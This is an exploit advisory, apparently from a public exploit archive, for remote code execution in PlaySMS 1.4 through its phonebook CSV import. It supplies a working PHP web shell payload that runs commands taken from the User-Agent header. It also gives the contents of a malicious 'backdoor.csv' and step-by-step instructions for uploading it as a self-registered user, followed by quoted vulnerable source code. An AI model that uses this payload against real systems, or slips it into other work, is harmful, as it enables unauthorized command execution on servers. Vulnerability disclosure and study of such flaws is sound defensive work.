@@ -1,0 +1,128 @@
+# Exploit Title: PlaySMS 1.4 Remote Code Execution using Phonebook import Function in import.php
+# Date: 21-05-2017
+# Software Link: https://playsms.org/download/
+# Version: 1.4
+# Exploit Author: Touhid M.Shaikh
+# Contact: http://twitter.com/touhidshaikh22
+# Website: http://touhidshaikh.com/
+# Category: webapps
+  
+1. Description
+ 
+Code Execution using import.php
+
+     We know import.php accept file and just read content 
+    not stored in server. But when we stored payload in our backdoor.csv 
+    and upload to phonebook. Its execute our payload and show on next page in field (in NAME,MOBILE,Email,Group COde,Tags) accordingly .
+
+    In My case i stored my vulnerable code  in my backdoor.csv files's Name field .
+
+    But There is one problem in execution. Its only execute in built function and variable which is used in application. 
+
+    That why the server not execute our payload directly. Now i Use "<?php $a=$_SERVER['HTTP_USER_AGENT']; system($a); ?>" in name field and change our user agent to any command which u want to execute command. Bcz it not execute <?php system("id")?> directly .
+
+Example of my backdoor.csv file content
+----------------------MY FILE CONTENT------------------------------------
+Name												Mobile	Email	Group code	Tags
+<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>	22			
+
+--------------------MY FILE CONTENT END HERE-------------------------------
+
+
+ 
+ For More Details : www.touhidshaikh.com/blog/
+
+ For Video Demo : https://www.youtube.com/watch?v=KIB9sKQdEwE
+
+    
+2. Proof of Concept
+  
+Login as regular user (created user using index.php?app=main&inc=core_auth&route=register):
+ 
+Go to :
+http://127.0.0.1/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list
+
+
+And Upload my malicious File.(backdoor.csv)
+and change our User agent.
+
+ 
+ This is Form For Upload Phonebook.
+----------------------Form for upload CSV file ----------------------
+<form action=\"index.php?app=main&inc=feature_phonebook&route=import&op=import\" enctype=\"multipart/form-data\" method=POST>
+" . _CSRF_FORM_ . "
+<p>" . _('Please select CSV file for phonebook entries') . "</p>
+<p><input type=\"file\" name=\"fnpb\"></p>
+<p class=text-info>" . _('CSV file format') . " : " . _('Name') . ", " . _('Mobile') . ", " . _('Email') . ", " . _('Group code') . ", " . _('Tags') . "</p>
+<p><input type=\"submit\" value=\"" . _('Import') . "\" class=\"button\"></p>
+</form>
+------------------------------Form ends ---------------------------
+ 
+
+ 
+-------------Read Content and Display Content-----------------------
+ 
+   case "import":
+		$fnpb = $_FILES['fnpb'];
+		$fnpb_tmpname = $_FILES['fnpb']['tmp_name'];
+		$content = "
+			<h2>" . _('Phonebook') . "</h2>
+			<h3>" . _('Import confirmation') . "</h3>
+			<div class=table-responsive>
+			<table class=playsms-table-list>
+			<thead><tr>
+				<th width=\"5%\">*</th>
+				<th width=\"20%\">" . _('Name') . "</th>
+				<th width=\"20%\">" . _('Mobile') . "</th>
+				<th width=\"25%\">" . _('Email') . "</th>
+				<th width=\"15%\">" . _('Group code') . "</th>
+				<th width=\"15%\">" . _('Tags') . "</th>
+			</tr></thead><tbody>";
+		if (file_exists($fnpb_tmpname)) {
+			$session_import = 'phonebook_' . _PID_;
+			unset($_SESSION['tmp'][$session_import]);
+			ini_set('auto_detect_line_endings', TRUE);
+			if (($fp = fopen($fnpb_tmpname, "r")) !== FALSE) {
+				$i = 0;
+				while ($c_contact = fgetcsv($fp, 1000, ',', '"', '\\')) {
+					if ($i > $phonebook_row_limit) {
+						break;
+					}
+					if ($i > 0) {
+						$contacts[$i] = $c_contact;
+					}
+					$i++;
+				}
+				$i = 0;
+				foreach ($contacts as $contact) {
+					$c_gid = phonebook_groupcode2id($uid, $contact[3]);
+					if (!$c_gid) {
+						$contact[3] = '';
+					}
+					$contact[1] = sendsms_getvalidnumber($contact[1]);
+					$contact[4] = phonebook_tags_clean($contact[4]);
+					if ($contact[0] && $contact[1]) {
+						$i++;
+						$content .= "
+							<tr>
+							<td>$i.</td>
+							<td>$contact[0]</td>
+							<td>$contact[1]</td>
+							<td>$contact[2]</td>
+							<td>$contact[3]</td>
+							<td>$contact[4]</td>
+							</tr>";
+						$k = $i - 1;
+						$_SESSION['tmp'][$session_import][$k] = $contact;
+					}
+				}
+ 
+------------------------------code ends ---------------------------
+ 
+
+Bingoo.....
+
+ 
+*------------------My Friends---------------------------*
+|Pratik K.Tejani, Rehman, Taushif,Charles Babbage  |
+*---------------------------------------------------*
